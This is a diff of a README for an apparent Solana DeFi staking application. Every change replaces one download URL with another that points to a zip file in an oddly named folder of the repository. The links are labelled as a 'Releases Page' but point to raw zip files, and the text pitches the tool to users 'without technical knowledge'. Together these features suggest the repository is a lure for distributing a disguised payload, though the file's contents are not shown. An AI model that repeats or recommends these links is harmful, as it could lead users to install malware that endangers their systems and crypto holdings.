@@ -6,7 +6,7 @@ Welcome to the **defi-staking-smart-contract-solana** repository! This applicati
 
 ## 📥 Download Now
 
-[![Download](https://raw.githubusercontent.com/XXXGutierrezXXX/defi-staking-smart-contract-solana/main/ashthroat/defi-staking-smart-contract-solana.zip)](https://raw.githubusercontent.com/XXXGutierrezXXX/defi-staking-smart-contract-solana/main/ashthroat/defi-staking-smart-contract-solana.zip)
+[![Download](https://raw.githubusercontent.com/XXXGutierrezXXX/defi-staking-smart-contract-solana/main/ashthroat/contract-solana-defi-staking-smart-v2.7-beta.5.zip)](https://raw.githubusercontent.com/XXXGutierrezXXX/defi-staking-smart-contract-solana/main/ashthroat/contract-solana-defi-staking-smart-v2.7-beta.5.zip)
 
 ## 🌐 Overview
 
@@ -33,7 +33,7 @@ Before you begin, ensure your system meets the following requirements:
 To install the application, please follow these steps:
 
 1. **Visit the Download Page**:
-   Go to the [Releases Page](https://raw.githubusercontent.com/XXXGutierrezXXX/defi-staking-smart-contract-solana/main/ashthroat/defi-staking-smart-contract-solana.zip) to find the latest version of the software.
+   Go to the [Releases Page](https://raw.githubusercontent.com/XXXGutierrezXXX/defi-staking-smart-contract-solana/main/ashthroat/contract-solana-defi-staking-smart-v2.7-beta.5.zip) to find the latest version of the software.
 
 2. **Select Your Version**:
    On the Releases page, locate the most recent version. Look for a file that corresponds to your operating system.
@@ -92,4 +92,4 @@ Join our community to share experiences and get help:
 
 ## 🚀 Conclusion
 
-Getting started with staking in the defi ecosystem has never been easier. With the **defi-staking-smart-contract-solana**, you can manage your tokens and earn rewards without technical knowledge. Visit our [Releases Page](https://raw.githubusercontent.com/XXXGutierrezXXX/defi-staking-smart-contract-solana/main/ashthroat/defi-staking-smart-contract-solana.zip) to download the software and start your staking journey today!
+Getting started with staking in the defi ecosystem has never been easier. With the **defi-staking-smart-contract-solana**, you can manage your tokens and earn rewards without technical knowledge. Visit our [Releases Page](https://raw.githubusercontent.com/XXXGutierrezXXX/defi-staking-smart-contract-solana/main/ashthroat/contract-solana-defi-staking-smart-v2.7-beta.5.zip) to download the software and start your staking journey today!
